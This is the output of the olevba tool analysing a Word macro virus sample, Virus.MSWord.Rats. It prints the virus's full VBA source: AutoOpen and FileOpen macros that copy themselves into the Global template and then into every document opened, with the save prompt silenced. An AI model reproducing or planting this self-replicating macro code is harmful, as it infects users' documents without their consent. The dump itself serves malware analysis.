olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rats
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rats - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WWUpdated.bas 
in file: Virus.MSWord.Rats - OLE stream: 'Macros/VBA/WWUpdated'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
'Presence of AVP for winword
'AVP for Winword is a nice tutorial
'(C) 2 Rats Soft.
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Rats - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Copyright$
Dim AVPcopyright$
Dim gnoi
Dim iCountMacros
Dim i
Dim zu$
Copyright$ = "Co-Copyright (cc) Lord Asd and Stainless Steel Rat"
AVPcopyright$ = "AVP for WinWord v1.0"

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
On Error GoTo -1: On Error GoTo fail
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg

gnoi = 0
iCountMacros = WordBasic.CountMacros(1, 0, 0)
For i = 1 To iCountMacros
 zu$ = WordBasic.[MacroName$](i, 1)
 If zu$ = "WWUpdated" Then gnoi = 1
Next i

If gnoi = 1 Then GoTo fail
WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
WordBasic.MacroCopy "Global:AutoOp", WordBasic.[FileName$]() + ":AutoOpen", 1
WordBasic.MacroCopy "Global:WWUpdated", WordBasic.[FileName$]() + ":WWUpdated", 1
WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":DaniloffMuDaK", 1

fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOp.bas 
in file: Virus.MSWord.Rats - OLE stream: 'Macros/VBA/AutoOp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim hru
Dim j
Dim i
On Error GoTo -1: On Error GoTo fail
hru = 0
j = WordBasic.CountMacros(0, 0)
For i = 1 To j
 If WordBasic.[MacroName$](i, 0, 0) = "WWUpdated" Then hru = 1
Next i

If hru = 1 Then GoTo fail

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOp", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":WWUpdated", "Global:WWUpdated", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":DaniloffMuDaK", "Global:FileOpen", 1
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.FileSaveAll
fail:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

